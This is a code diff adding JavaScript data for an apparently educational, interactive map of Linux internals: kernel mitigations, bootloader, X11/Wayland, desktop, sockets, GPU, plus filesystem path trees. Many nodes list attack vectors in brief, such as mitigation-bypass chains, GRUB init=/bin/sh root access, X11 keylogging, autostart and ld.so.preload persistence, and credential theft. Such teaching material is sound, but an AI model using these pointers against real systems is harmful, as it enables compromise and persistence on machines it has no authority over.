+  {l:'SMEP / SMAP (CPU)',s:['SMEP: kernel cannot exec user pages','SMAP: kernel cannot read user data','Set in CR4 register at boot','Bypass requires kernel write → pivot stack'],lk:'mmu'},
+  {l:'KPTI (Meltdown fix)',s:['Separate user/kernel page tables','Shadow kernel mapping (minimal)','PCID optimisation (avoid full TLB flush)','Performance cost ~5–30% on older CPUs'],lk:'mmu'},
+  {l:'Stack Canary / Shadow Stack',s:['GCC -fstack-protector-strong','Canary: random value before saved ret addr','Shadow call stack (ARM PAC / x86 CET)','Overwrite canary → detect at function return'],lk:null},
+  {l:'CFI / KCFI',s:['Control Flow Integrity','Forward-edge: indirect call target check','Backward-edge: shadow stack / RA signing','Clang CFI in Android kernel'],lk:null},
+  {l:'RELRO / PIE / NX',s:['RELRO: GOT read-only after linker init','PIE: ASLR applies to executable too','NX / W^X: pages not both writable and executable','Hardware NX bit (IA32_EFER.NXE)'],lk:'libc_node'},
+ ],
+ security:['Bypass chain: info leak → KASLR defeat → ROP chain → SMEP blocked → kernel stack pivot','SMAP bypass: copy_to_user gadget with kernel ptr','KPTI bypass: speculative execution gadget','Canary bypass: read canary first (format string / leak)','CFI bypass: same-type constraint tricks'],
+ related:['kernel_core','vm_subsys','mmu','libc_node'],
+ paths:{up:['kernel_core'],down:[],xref:['vm_subsys','mmu','libc_node']}},
+
+// ─ GUI / BOOT ─
+{id:'bootloader_node',layer:'gui',wx:140, wy:110,  label:'GRUB2 / Bootloader',
+ desc:'First code after UEFI. Parses grub.cfg, loads vmlinuz + initramfs. initramfs mounts real root. Kernel cmdline sets early boot options.',
+ components:[
+  {l:'GRUB2 Config',s:['/boot/grub/grub.cfg','update-grub / grub-mkconfig','menuentry { linux / initrd }','GRUB_CMDLINE_LINUX_DEFAULT'],lk:null},
+  {l:'initramfs / initrd',s:['Early userspace (BusyBox / systemd)','Mounts real rootfs','dracut / mkinitramfs builders','/etc/initramfs-tools/modules list'],lk:'filesystem'},
+  {l:'Kernel Cmdline Params',s:['quiet splash (normal boot)','init=/bin/sh (bypass init system)','rd.break (drop to initramfs shell)','nokaslr (debug: disables KASLR)'],lk:'kernel_core'},
+  {l:'GRUB Password',s:['set superusers="root"','password_pbkdf2 root <hash>','Protects menu entry editing','Without it: init=/bin/sh trivial via console'],lk:null},
+ ],
+ security:['GRUB menu edit → init=/bin/sh → root (no disk encryption)','CVE-2020-10713 BootHole: OOB in grub.cfg parser','initramfs backdoor (custom initrd injection)','nokaslr in cmdline defeats KASLR entirely','Physical access = game over without disk enc + GRUB pw'],
+ related:['firmware','tpm_node','kernel_core'],
+ paths:{up:['firmware','tpm_node'],down:['kernel_core'],xref:[]}},
+
+{id:'xorg_node',  layer:'gui',    wx:460,  wy:110,  label:'X11 / Xorg Server',
+ desc:'Legacy display server. X11 protocol over UNIX sockets. Any local X client can read all keystrokes and capture screenshots with no special permissions.',
+ components:[
+  {l:'X Server Architecture',s:['Single server, multiple clients','DISPLAY=:0 environment variable','X11 forwarding (ssh -X / -Y)','XCB / Xlib client libraries'],lk:null},
+  {l:'X11 Input / Output',s:['XGrabKeyboard() / XGrabPointer()','XGetImage() screenshot (any client)','XSendEvent() input injection','XKB extension (keyboard mapping)'],lk:null},
+  {l:'MIT-MAGIC-COOKIE',s:['~/.Xauthority auth file','Cookie = session authentication token','xauth list / add / remove','Forwarded over SSH -X tunnel'],lk:'ssh_node'},
+  {l:'Xorg Extensions',s:['RANDR (display configuration)','RECORD (input event recording)','DAMAGE (dirty region tracking)','GLX (OpenGL via X11)'],lk:null},
+ ],
+ security:['Keylogging: any local X client reads all input without permissions','Screenshot theft: XGetImage requires no special privilege','xterm escape code injection','X11 forwarding MITM (trusted vs untrusted mode)','MIT-MAGIC-COOKIE theft → full display access'],
+ related:['wayland_node','dbus_node','ssh_node'],
+ paths:{up:['drivers'],down:[],xref:['wayland_node']}},
+
+{id:'wayland_node',layer:'gui',   wx:780,  wy:110,  label:'Wayland Compositor',
+ desc:'Modern display protocol. Compositor is both display server and window manager. Clients cannot spy on each other — major security improvement over X11.',
+ components:[
+  {l:'Wayland Protocol',s:['wl_display (connection object)','wl_compositor, wl_surface, wl_seat','Event-driven object protocol','Unix socket: /run/user/UID/wayland-0'],lk:null},
+  {l:'Compositors',s:['Mutter (GNOME)','KWin (KDE Plasma)','Sway (i3 clone, wlroots-based)','Weston (reference implementation)'],lk:'desktop_node'},
+  {l:'XWayland',s:['X server running as Wayland client','Legacy X11 app compatibility layer','Isolated: X clients cannot see Wayland','XWayland still has X11 security model'],lk:'xorg_node'},
+  {l:'Portal API (xdg-desktop-portal)',s:['Screen capture via portal (user consent)','File picker portal','Flatpak sandbox communication','D-Bus exposed portal interfaces'],lk:'dbus_node'},
+ ],
+ security:['XWayland: X11 apps can still spy on each other inside it','Compositor-specific CVEs (Mutter, KWin)','Screen capture portal bypass','Input injection via Wayland protocol bug','Rootless XWayland isolation model'],
+ related:['xorg_node','dbus_node','desktop_node'],
+ paths:{up:['drivers'],down:['desktop_node'],xref:['xorg_node','dbus_node']}},
+
+{id:'desktop_node',layer:'gui',   wx:1100, wy:110,  label:'Desktop Environment',
+ desc:'GNOME/KDE/XFCE run as user. Autostart entries are a persistence vector. Heavy D-Bus usage. Polkit for privilege actions. Credential manager integration.',
+ components:[
+  {l:'GNOME Shell / KDE Plasma',s:['JavaScript extensions (GNOME Shell)','Plasma widgets (QML / C++)','Mutter (GNOME) / KWin (KDE) compositor','GNOME Extensions API (significant attack surface)'],lk:'wayland_node'},
+  {l:'dconf / GSettings',s:['Binary settings database (dconf)','dconf write /org/gnome/... (manipulation)','GSettings schema validation','Per-user: ~/.config/dconf/user'],lk:'dbus_node'},
+  {l:'Autostart Entries',s:['~/.config/autostart/*.desktop','[Desktop Entry] Exec=payload','/etc/xdg/autostart/ (system-wide)','XDG autostart specification'],lk:'filesystem'},
+  {l:'Credential Storage',s:['GNOME Keyring / KWallet','Secret Service D-Bus API','Unlocked on login (pam_gnome_keyring)','secretstorage Python library'],lk:'pam_node'},
+ ],
+ security:['Malicious .desktop autostart persistence','dconf manipulation (change settings as user)','GNOME Shell extension RCE (arbitrary JavaScript)','Credential theft via Secret Service D-Bus API','Screen lock bypass (historical CVEs)'],
+ related:['wayland_node','dbus_node','filesystem'],
+ paths:{up:['wayland_node'],down:[],xref:['dbus_node','filesystem']}},
+
+{id:'socket_node',layer:'gui',    wx:1420, wy:110,  label:'Socket / Network API',
+ desc:'POSIX socket API bridges userspace and the kernel network stack. AF_INET for TCP/UDP, AF_UNIX for local IPC, AF_PACKET for raw frames.',
+ components:[
+  {l:'TCP Socket Lifecycle',s:['socket() → bind() → listen() → accept()','connect() for client side','send() / recv() / sendmsg()','SO_REUSEADDR / SO_REUSEPORT'],lk:'net_stack'},
+  {l:'AF_UNIX (Domain Sockets)',s:['Faster than TCP (no IP overhead)','Abstract namespace (no file in FS)','SOCK_STREAM / DGRAM / SEQPACKET','SCM_CREDENTIALS (peer uid check)'],lk:null},
+  {l:'AF_PACKET (Raw Frames)',s:['Requires CAP_NET_RAW','Receives all frames on interface','Used by tcpdump, Wireshark','AF_PACKET + SOCK_DGRAM (cooked mode)'],lk:null},
+  {l:'AF_NETLINK',s:['Kernel ↔ userspace config messages','rtnetlink (routing), nlctrl','Requires CAP_NET_ADMIN for writes','ip / ss commands use netlink'],lk:'net_stack'},
+  {l:'TLS via openssl / gnutls',s:['BIO abstraction wraps raw socket','SSL_connect() / SSL_accept()','Certificate pinning (application level)','ALPN / SNI negotiation'],lk:'openssl_node'},
+ ],
+ security:['Raw socket sniffing (CAP_NET_RAW)','SSRF via socket reuse','UNIX socket permission bypass','Netlink privilege escalation','SO_REUSEPORT port hijack race','TLS downgrade (legacy cipher negotiation)'],
+ related:['net_stack','netfilter_node','ssh_node','openssl_node'],
+ paths:{up:['net_stack'],down:[],xref:['netfilter_node','openssl_node']}},
+
+{id:'drm_node',   layer:'gui',    wx:1740, wy:110,  label:'DRM / KMS / GPU',
+ desc:'Direct Rendering Manager: kernel manages GPU resources. KMS (Kernel Mode Setting) manages display modes. GPU executes command ring. VRAM accessible via DMA-BUF.',
+ components:[
+  {l:'DRM Core',s:['drm_device (one per GPU)','drm_crtc / drm_plane / drm_connector','Atomic modesetting (all-or-nothing)','/dev/dri/cardN + renderDN'],lk:'drivers'},
+  {l:'GEM (Graphics Execution Manager)',s:['GEM object buffer allocations','dma-buf sharing (cross-process)','GEM handles in file descriptor space','mmap GEM object → userspace VA'],lk:'mmu'},
+  {l:'Command Ring Buffer',s:['Ring buffer of GPU commands','DRM scheduler (priority queues)','GPU context isolation','Command stream validation in driver'],lk:null},
+  {l:'Mesa / Vulkan / OpenGL',s:['Userspace GPU driver (Mesa)','Vulkan: explicit GPU API','GLSL shader compilation → SPIRV','SPIRV bytecode format'],lk:null},
+ ],
+ security:['GPU side-channel: cross-context pixel theft','VRAM forensics: uncleared previous-context buffers','DRM ioctl vulnerabilities in driver','GPU reset attack (cross-process VRAM persistence)','Shader JIT exploitation (theoretical)'],
+ related:['nic_hw','drivers','mmu'],
+ paths:{up:['nic_hw','drivers'],down:[],xref:['mmu']}},
+];
+
+// ── EDGES ──
+const EDGES = [
+  {a:'cpu',b:'kernel_core'},{a:'mmu',b:'vm_subsys'},{a:'memory',b:'vm_subsys'},
+  {a:'firmware',b:'bootloader_node'},{a:'nic_hw',b:'drivers'},
+  {a:'kernel_core',b:'scheduler'},{a:'kernel_core',b:'vm_subsys'},
+  {a:'kernel_core',b:'net_stack'},{a:'kernel_core',b:'proc_fs'},
+  {a:'kernel_core',b:'syscall_iface'},{a:'kernel_core',b:'drivers'},
+  {a:'net_stack',b:'netfilter_node'},{a:'drivers',b:'dma'},
+  {a:'drivers',b:'irq_node'},{a:'vm_subsys',b:'filesystem'},
+  {a:'syscall_iface',b:'libc_node'},{a:'syscall_iface',b:'seccomp_node'},
+  {a:'filesystem',b:'dac_node'},{a:'filesystem',b:'selinux_node'},
+  {a:'net_stack',b:'socket_node'},
+  {a:'libc_node',b:'glibc_load'},{a:'libc_node',b:'openssl_node'},
+  {a:'openssl_node',b:'socket_node'},{a:'dbus_node',b:'systemd_node'},
+  {a:'libc_node',b:'shell_node'},{a:'libc_node',b:'process_node'},
+  {a:'glibc_load',b:'process_node'},{a:'pam_node',b:'sudo_node'},
+  {a:'pam_node',b:'ssh_node'},{a:'openssl_node',b:'ssh_node'},
+  {a:'dbus_node',b:'desktop_node'},{a:'ebpf_node',b:'net_stack'},
+  {a:'systemd_node',b:'process_node'},{a:'shell_node',b:'process_node'},
+  {a:'process_node',b:'cgroups_node'},
+  {a:'process_node',b:'seccomp_node'},{a:'process_node',b:'dac_node'},
+  {a:'cgroups_node',b:'seccomp_node'},{a:'systemd_node',b:'audit_node'},
+  {a:'sudo_node',b:'selinux_node'},{a:'ssh_node',b:'socket_node'},
+  {a:'selinux_node',b:'dac_node'},{a:'netfilter_node',b:'net_stack'},
+  {a:'tpm_node',b:'bootloader_node'},{a:'audit_node',b:'selinux_node'},
+  {a:'sec_mech',b:'vm_subsys'},{a:'sec_mech',b:'kernel_core'},
+  {a:'ebpf_node',b:'seccomp_node'},
+  {a:'bootloader_node',b:'kernel_core'},
+  {a:'xorg_node',b:'wayland_node'},{a:'wayland_node',b:'desktop_node'},
+  {a:'desktop_node',b:'dbus_node'},{a:'socket_node',b:'net_stack'},
+  {a:'drm_node',b:'drivers'},{a:'wayland_node',b:'drm_node'},
+  {a:'dma',b:'mmu'},{a:'irq_node',b:'cpu'},
+];
+
+const NODE_MAP = {};
+NODES.forEach(n=>NODE_MAP[n.id]=n);
+
+// ══════════════════════════════════════════
+//  FILESYSTEM PATH TREES  (per-node)
+//  Structure: [ { path, desc, children: [ { name, desc, purpose?, children? } ] } ]
+// ══════════════════════════════════════════
+const FS_PATHS = {
+
+firmware: [
+  { path:'/sys/firmware/efi/', desc:'UEFI runtime access', children:[
+    { name:'efivars/', desc:'NVRAM variables (boot order, Secure Boot keys)', purpose:'Read/write UEFI vars via efivarfs' },
+    { name:'vars/', desc:'Legacy EFI variable interface (deprecated)', purpose:'Older kernel interface, mostly gone' },
+  ]},
+  { path:'/boot/', desc:'Boot partition — read by GRUB & kernel', children:[
+    { name:'EFI/', desc:'UEFI boot partition (FAT32)', purpose:'EFI executable search path',
+      children:[ { name:'BOOT/BOOTX64.EFI', desc:'Default UEFI fallback bootloader' }, { name:'ubuntu/shimx64.efi', desc:'Signed shim for Secure Boot chain' }, { name:'ubuntu/grubx64.efi', desc:'GRUB EFI binary, loaded by shim' } ]},
+    { name:'vmlinuz-*', desc:'Compressed kernel image', purpose:'Loaded by GRUB bootcmd' },
+    { name:'initrd.img-*', desc:'Initial RAM disk (early userspace)', purpose:'Mounts real root before pivot_root' },
+    { name:'grub/grub.cfg', desc:'GRUB menu and boot configuration', purpose:'Auto-generated by update-grub' },
+  ]},
+],
+
+bootloader_node: [
+  { path:'/boot/grub/', desc:'GRUB2 configuration and modules', children:[
+    { name:'grub.cfg', desc:'Main config (auto-generated, do not edit directly)', purpose:'Generated by grub-mkconfig from /etc/grub.d/* + /etc/default/grub' },
+    { name:'grubenv', desc:'GRUB environment block — 1024 bytes', purpose:'Stores boot_success, next-boot entry' },
+    { name:'i386-pc/ or x86_64-efi/', desc:'Platform-specific GRUB modules (.mod)', purpose:'ext2.mod, luks.mod, cryptodisk.mod etc.' },
+  ]},
+  { path:'/etc/default/', desc:'Boot parameters (user-editable)', children:[
+    { name:'grub', desc:'Main GRUB defaults file', purpose:'GRUB_CMDLINE_LINUX_DEFAULT, GRUB_TIMEOUT, GRUB_DISABLE_RECOVERY' },
+  ]},
+  { path:'/etc/grub.d/', desc:'Scripts that generate grub.cfg', children:[
+    { name:'00_header', desc:'Sets timeout, gfxterm, locale', purpose:'First script — defines global settings' },
+    { name:'10_linux', desc:'Detects installed kernels and adds menu entries', purpose:'Generates one entry per /boot/vmlinuz-*' },
+    { name:'30_os-prober', desc:'Detects other OSes (Windows, etc.)', purpose:'Adds dual-boot entries if os-prober installed' },
+    { name:'40_custom', desc:'User-defined custom entries', purpose:'Add your own menuentry blocks here' },
+  ]},
+  { path:'/boot/', desc:'Kernel and initramfs images', children:[
+    { name:'vmlinuz-<version>', desc:'Compressed kernel (bzImage format)', purpose:'Loaded by: linux /boot/vmlinuz-... in grub.cfg' },
+    { name:'initrd.img-<version>', desc:'Initial RAM disk archive (cpio+gzip)', purpose:'Contains early drivers, cryptsetup, pivot_root logic' },
+    { name:'config-<version>', desc:'Kernel build config used for this image', purpose:'Reference: grep CONFIG_STACKPROTECTOR /boot/config-*' },
+    { name:'System.map-<version>', desc:'Symbol→address table for this kernel', purpose:'Used by klogd, crash analysis tools' },
+  ]},
+],
+
+kernel_core: [
+  { path:'/proc/sys/kernel/', desc:'Runtime kernel parameter tuning', children:[
+    { name:'hostname', desc:'System hostname', purpose:'Read/write: echo myhostname > /proc/sys/kernel/hostname' },
+    { name:'dmesg_restrict', desc:'0=world-readable, 1=root only', purpose:'Security: set to 1 to hide kernel addresses from users' },
+    { name:'kptr_restrict', desc:'0=expose, 1=hide unless root, 2=always hide', purpose:'Hides /proc/kallsyms addresses — defeats KASLR bypasses' },
+    { name:'perf_event_paranoid', desc:'Controls perf_event access (-1 to 3)', purpose:'Higher = more restricted; -1 = unrestricted (dangerous)' },
+    { name:'randomize_va_space', desc:'ASLR: 0=off, 1=partial, 2=full', purpose:'Security: must be 2 for full ASLR' },
+    { name:'pid_max', desc:'Maximum PID value (default 32768)', purpose:'Increase on large servers: echo 4194304 > ...' },
+    { name:'yama/ptrace_scope', desc:'0=any, 1=children only, 2=root, 3=none', purpose:'Restricts ptrace: set 1 to prevent ptrace injection attacks' },
+  ]},
+  { path:'/boot/', desc:'Kernel images and config', children:[
+    { name:'vmlinuz-$(uname -r)', desc:'Currently running kernel image', purpose:'Symlinked to /vmlinuz on Debian/Ubuntu' },
+    { name:'config-$(uname -r)', desc:'Kernel .config for running kernel', purpose:'grep CONFIG_SECURITY_SELINUX /boot/config-*' },
+    { name:'System.map-$(uname -r)', desc:'Kernel symbol table', purpose:'Used by crash analysis, rootkit detection' },
+  ]},
+  { path:'/lib/modules/', desc:'Loadable kernel modules', children:[
+    { name:'$(uname -r)/', desc:'Version-specific module directory', purpose:'',
+      children:[
+        { name:'kernel/', desc:'All built modules (drivers, fs, net, etc.)' },
+        { name:'modules.dep', desc:'Module dependency map — built by depmod' },
+        { name:'modules.alias', desc:'Hardware ID → module name map (udev uses this)' },
+        { name:'modules.blacklist', desc:'Modules blocked from autoloading' },
+      ]
+    },
+  ]},
+  { path:'/sys/kernel/', desc:'Runtime kernel tunables and debug', children:[
+    { name:'debug/', desc:'debugfs mount point (if mounted)', purpose:'Contains eBPF, kprobes, KASAN output' },
+    { name:'security/', desc:'LSM interfaces (SELinux, AppArmor, IMA)', purpose:'IMA measurement log, SELinux policy' },
+    { name:'mm/', desc:'Memory management tunables', purpose:'transparent_hugepage, ksm, mmap_min_addr' },
+  ]},
+],
+
+vm_subsys: [
+  { path:'/proc/sys/vm/', desc:'Virtual memory subsystem tuning', children:[
+    { name:'swappiness', desc:'0–100: how aggressively to swap (default 60)', purpose:'Lower = prefer RAM; set 10 on desktops' },
+    { name:'overcommit_memory', desc:'0=heuristic, 1=always, 2=never', purpose:'2=strict: prevents OOM by refusing over-alloc' },
+    { name:'overcommit_ratio', desc:'% of RAM+swap allowed when overcommit=2', purpose:'Default 50; controls max committed memory' },
+    { name:'dirty_ratio', desc:'% dirty pages before process writes block', purpose:'Default 20; lower for write-heavy servers' },
+    { name:'dirty_background_ratio', desc:'% dirty pages before background flush', purpose:'Default 10; pdflush/kswapd trigger point' },
+    { name:'mmap_min_addr', desc:'Minimum mmap address (prevents NULL deref)', purpose:'Security: default 65536; NULL pointer exploit mitigation' },
+    { name:'drop_caches', desc:'Write 1/2/3 to free page/slab/all cache', purpose:'Debug/testing only — do not use in production' },
+  ]},
+  { path:'/proc/<pid>/', desc:'Per-process virtual memory info', children:[
+    { name:'maps', desc:'Virtual memory areas (VMAs) — readable', purpose:'Shows: address range, perms (rwxp), offset, device, inode, path\nFormat: addr-addr perms offset dev inode pathname' },
+    { name:'smaps', desc:'Detailed per-VMA memory stats', purpose:'RSS, PSS, anonymous, shared per region — used by pmap' },
+    { name:'mem', desc:'Direct R/W to process address space', purpose:'Used by debuggers (ptrace), and injection attacks' },
+    { name:'pagemap', desc:'PFN (physical frame) per virtual page', purpose:'Requires root; used for Rowhammer tooling' },
+    { name:'status', desc:'Human-readable process memory summary', purpose:'VmRSS, VmPeak, VmSwap values' },
+  ]},
+],
+
+proc_fs: [
+  { path:'/proc/', desc:'Kernel & process state (virtual, in RAM)', children:[
+    { name:'<pid>/', desc:'Per-process directory', purpose:'',
+      children:[
+        { name:'cmdline', desc:'Full command line (\0-delimited)' },
+        { name:'environ', desc:'Environment variables at exec time (security risk if world-readable)' },
+        { name:'maps', desc:'VMA layout — used to defeat ASLR' },
+        { name:'mem', desc:'Process memory R/W — injection vector' },
+        { name:'fd/', desc:'Symlinks to open file descriptors' },
+        { name:'net/', desc:'Network state visible to this process namespace' },
+        { name:'status', desc:'UID, GID, capabilities, memory summary' },
+        { name:'syscall', desc:'Currently executing syscall + arguments' },
+      ]
+    },
+    { name:'kallsyms', desc:'All kernel symbols + addresses', purpose:'kptr_restrict=2 → shows 0000000000000000 for unprivileged reads' },
+    { name:'kcore', desc:'Kernel address space as ELF core (requires CAP_SYS_RAWIO)', purpose:'Size = entire physical RAM — forensic and attack tool' },
+    { name:'modules', desc:'Loaded kernel modules list', purpose:'Same as lsmod; shows rootkit hiding gaps' },
+    { name:'mounts', desc:'Mounted filesystems for current namespace', purpose:'Check for unexpected mounts, container escape indicators' },
+    { name:'net/', desc:'Network subsystem info', purpose:'',
+      children:[
+        { name:'tcp', desc:'All TCP connections (local+remote addr/port, state)' },
+        { name:'tcp6', desc:'IPv6 TCP connections' },
+        { name:'udp', desc:'UDP sockets' },
+        { name:'arp', desc:'ARP cache (IP → MAC table)' },
+        { name:'dev', desc:'Per-interface packet stats' },
+        { name:'nf_conntrack', desc:'Netfilter connection tracking table' },
+      ]
+    },
+    { name:'sys/', desc:'Kernel tunable parameters (sysctl)', purpose:'Writable via sysctl or direct echo — see /proc/sys/kernel' },
+  ]},
+  { path:'/sys/', desc:'Device model & kernel objects (sysfs)', children:[
+    { name:'class/', desc:'Device classes (net, block, tty, input…)', purpose:'ls /sys/class/net → network interfaces' },
+    { name:'bus/', desc:'Hardware buses (pci, usb, platform)', purpose:'Used by udev for device hotplug rules' },
+    { name:'kernel/', desc:'Kernel internals and tunables', purpose:'security/, mm/, debug/ subdirs' },
+    { name:'fs/', desc:'Filesystem-specific interfaces', purpose:'cgroup/, fuse/, ext4/, bpf/ dirs' },
+    { name:'devices/', desc:'Full device tree (parent→child)', purpose:'Mirrors physical device hierarchy' },
+    { name:'module/', desc:'Loaded module parameters', purpose:'e.g. /sys/module/tcp_cubic/parameters/' },
+  ]},
+  { path:'/dev/', desc:'Device nodes (char & block)', children:[
+    { name:'null', desc:'Discard all writes, read returns EOF', purpose:'Redirect unwanted output: cmd > /dev/null' },
+    { name:'zero', desc:'Read returns infinite zero bytes', purpose:'Fill files: dd if=/dev/zero of=file bs=1M count=100' },
+    { name:'urandom', desc:'CSPRNG output (non-blocking)', purpose:'Generate keys: openssl rand uses this' },
+    { name:'random', desc:'CSPRNG (blocks until sufficient entropy)', purpose:'Use /dev/urandom in practice — /dev/random blocking is a myth on Linux 5.6+' },
+    { name:'mem', desc:'Physical RAM access (/dev/mem)', purpose:'Requires CAP_SYS_RAWIO; attack vector for rootkits' },
+    { name:'ptmx', desc:'Pseudo-terminal multiplexer (master)', purpose:'Terminal emulators open this to create pty pairs' },
+    { name:'tty', desc:'Controlling terminal of current process', purpose:'write /dev/tty → writes to user terminal regardless of redirects' },
+    { name:'sda, sdb, nvme0n1…', desc:'Block device nodes', purpose:'Direct partition access — bypass filesystem permissions' },
+    { name:'dri/', desc:'DRM GPU devices', purpose:'card0 = privileged (modesetting), renderD128 = unprivileged rendering' },
+    { name:'input/', desc:'Input device nodes (keyboard, mouse)', purpose:'event0… — readable by members of input group' },
+  ]},
+],
+
+drivers: [
+  { path:'/lib/modules/$(uname -r)/kernel/', desc:'Compiled kernel module tree', children:[
+    { name:'drivers/', desc:'Hardware driver modules', purpose:'',
+      children:[
+        { name:'net/', desc:'Network driver modules (e1000e.ko, iwlwifi.ko)' },
+        { name:'block/', desc:'Block device drivers (nvme.ko, virtio_blk.ko)' },
+        { name:'usb/', desc:'USB class drivers (usb-storage.ko, usbhid.ko)' },
+        { name:'gpu/', desc:'GPU drivers (amdgpu.ko, i915.ko, nouveau.ko)' },
+        { name:'char/', desc:'Character device drivers (tty, serial, mem)' },
+      ]
+    },
+    { name:'fs/', desc:'Filesystem modules (ext4.ko, btrfs.ko, nfs.ko)', purpose:'Loaded on mount if not built-in' },
+    { name:'net/', desc:'Network protocol modules (tun.ko, veth.ko)', purpose:'tun.ko required for OpenVPN, WireGuard' },
+    { name:'crypto/', desc:'Crypto algorithm modules', purpose:'aesni-intel.ko, sha256_generic.ko etc.' },
+    { name:'security/', desc:'LSM modules (selinux.ko, apparmor.ko)', purpose:'Loaded early in boot, before root mount' },
+  ]},
+  { path:'/etc/modprobe.d/', desc:'Module loading configuration', children:[
+    { name:'blacklist.conf', desc:'Blacklisted modules (prevent autoload)', purpose:'blacklist pcspkr → prevents PC speaker driver loading' },
+    { name:'*.conf', desc:'Per-module options and aliases', purpose:'options iwlwifi 11n_disable=1 → disable 802.11n' },
+  ]},
+  { path:'/etc/modules-load.d/', desc:'Modules to load at boot', children:[
+    { name:'modules.conf', desc:'List of module names, one per line', purpose:'Loaded unconditionally by systemd-modules-load.service' },
+  ]},
+  { path:'/sys/bus/pci/devices/', desc:'PCI device info (live)', children:[
+    { name:'0000:00:00.0/', desc:'Individual PCI device (domain:bus:slot.func)', purpose:'',
+      children:[
+        { name:'vendor', desc:'PCI vendor ID (hex)' },
+        { name:'device', desc:'PCI device ID (hex)' },
+        { name:'class', desc:'PCI class code' },
+        { name:'driver/', desc:'Symlink to bound driver' },
+        { name:'resource', desc:'MMIO/IO port BAR ranges' },
+        { name:'rom', desc:'Option ROM (if present)' },
+      ]
+    },
+  ]},
+],
+
+filesystem: [
+  { path:'/etc/fstab', desc:'Static filesystem mount table', children:[
+    { name:'fstab', desc:'Format: device mountpoint fstype options dump pass', purpose:'Example: UUID=xxx / ext4 errors=remount-ro 0 1\nnodev,nosuid,noexec options harden /tmp' },
+  ]},
+  { path:'/etc/mtab → /proc/self/mounts', desc:'Currently mounted filesystems', children:[
+    { name:'(symlink to /proc/self/mounts)', desc:'Shows all active mounts for current namespace', purpose:'Use: cat /proc/mounts; or: findmnt' },
+  ]},
+  { path:'/proc/filesystems', desc:'Registered filesystem types', children:[
+    { name:'(virtual file)', desc:'Lists nodev (virtual) and block filesystems', purpose:'cat /proc/filesystems → ext4, btrfs, tmpfs, proc, sysfs...' },
+  ]},
+  { path:'/sys/fs/', desc:'Filesystem-specific kernel interfaces', children:[
+    { name:'ext4/', desc:'ext4 tuning per-filesystem', purpose:'',
+      children:[
+        { name:'sda1/', desc:'Per-device settings' },
+        { name:'errors_count', desc:'Count of filesystem errors' },
+        { name:'mb_stats', desc:'Multiblock allocator stats' },
+      ]
+    },
+    { name:'btrfs/', desc:'Btrfs device info', purpose:'btrfs fi show, btrfs subvol list' },
+    { name:'cgroup/', desc:'cgroup v1 hierarchy mount', purpose:'Modern systems use /sys/fs/cgroup (unified v2)' },
+    { name:'bpf/', desc:'BPF object pin directory', purpose:'bpftool pins objects here for persistence across program exit' },
+  ]},
+  { path:'/run/', desc:'Runtime data (tmpfs, cleared on boot)', children:[
+    { name:'lock/', desc:'Application lock files (.lock, .pid)', purpose:'Prevents duplicate daemon instances' },
+    { name:'user/<uid>/', desc:'Per-user runtime dir (XDG_RUNTIME_DIR)', purpose:'Wayland socket, systemd user session, dbus socket' },
+    { name:'systemd/', desc:'systemd runtime state', purpose:'units/, sessions/, private/ subdirs' },
+    { name:'udev/', desc:'udev runtime state and rules', purpose:'data/, rules.d/ for runtime-generated rules' },
+    { name:'mount/', desc:'Mount namespace data', purpose:'Used by systemd-mount for transient mounts' },
+  ]},
+  { path:'/tmp/', desc:'Temporary files (often tmpfs)', children:[
+    { name:'(world-writable + sticky bit)', desc:'Anyone can create; only owner can delete own files', purpose:'Sticky bit: mode 1777\nAttack: race conditions, hardlink attacks (mitigated by fs.protected_hardlinks=1)' },
+  ]},
+],
+
+libc_node: [
+  { path:'/lib/x86_64-linux-gnu/', desc:'System shared libraries (glibc on Debian/Ubuntu)', children:[
+    { name:'libc.so.6', desc:'glibc C standard library', purpose:'Contains: malloc, printf, open, fork, exec — virtually every C program links this' },
+    { name:'libpthread.so.0', desc:'POSIX threads (NPTL)', purpose:'Provides: pthread_create, mutex, condition variables' },
+    { name:'libm.so.6', desc:'Math library', purpose:'sin, cos, pow, sqrt — can be separate from libc' },
+    { name:'libdl.so.2', desc:'Dynamic linking (dlopen/dlsym)', purpose:'Runtime loading of shared objects' },
+    { name:'librt.so.1', desc:'POSIX real-time extensions', purpose:'shm_open, mq_open, clock_gettime (often in libc now)' },
+    { name:'ld-linux-x86-64.so.2', desc:'Dynamic linker/loader', purpose:'First code to run in any dynamically-linked ELF; loads all .so deps' },
+    { name:'libcrypt.so.1', desc:'Password hashing (crypt())', purpose:'Used by PAM for /etc/shadow hash verification' },
+    { name:'libresolv.so.2', desc:'DNS resolver library', purpose:'getaddrinfo() → resolves names via /etc/resolv.conf' },
+    { name:'libnss_*.so', desc:'NSS plugins (dns, files, ldap, compat)', purpose:'Plugged in by /etc/nsswitch.conf — getpwnam, getgrnam resolution' },
+  ]},
+  { path:'/etc/', desc:'glibc runtime configuration', children:[
+    { name:'ld.so.conf', desc:'Includes /etc/ld.so.conf.d/*.conf', purpose:'Directories searched for shared libraries' },
+    { name:'ld.so.conf.d/', desc:'Drop-in library search path configs', purpose:'x86_64-linux-gnu.conf → /lib/x86_64-linux-gnu' },
+    { name:'ld.so.cache', desc:'Binary cache of library locations (built by ldconfig)', purpose:'Run ldconfig after installing new .so files' },
+    { name:'nsswitch.conf', desc:'Name service switch configuration', purpose:'passwd: files systemd → try /etc/passwd first, then systemd\nhosts: files mdns4_minimal [NOTFOUND=return] dns' },
+  ]},
+  { path:'/etc/ld.so.preload', desc:'Force-load these .so files into every process', children:[
+    { name:'(path list, one per line)', desc:'Loaded before all others — including libc itself', purpose:'Legitimate: preload libraries for debugging or monitoring\nAttack: root-planted rootkit hook that intercepts all function calls system-wide' },
+  ]},
+],
+
+glibc_load: [
+  { path:'/proc/<pid>/maps  (PLT/GOT view)', desc:'VA layout showing .plt and .got.plt segments', children:[
+    { name:'.text segment', desc:'Executable code region (r-xp)', purpose:'Contains the .plt stub entries (5-byte jmp + push + jmp)' },
+    { name:'.got.plt segment', desc:'Global Offset Table (rw-p)', purpose:'Stores resolved addresses; FULL RELRO makes this r--p after init' },
+    { name:'[heap]', desc:'Heap region (brk expansion)', purpose:'ptmalloc arenas live here' },
+    { name:'[stack]', desc:'Main thread stack (grows down)', purpose:'Return addresses, saved RBP, local vars — exploit target' },
+    { name:'ld-linux-*.so', desc:'Dynamic linker mapped region', purpose:'First code to run; resolves symbols lazily or eagerly' },
+  ]},
+  { path:'/etc/environment', desc:'System-wide environment variables', children:[
+    { name:'environment', desc:'Key=value pairs loaded by PAM for all login sessions', purpose:'LD_PRELOAD here would affect all users — high-value persistence location' },
+  ]},
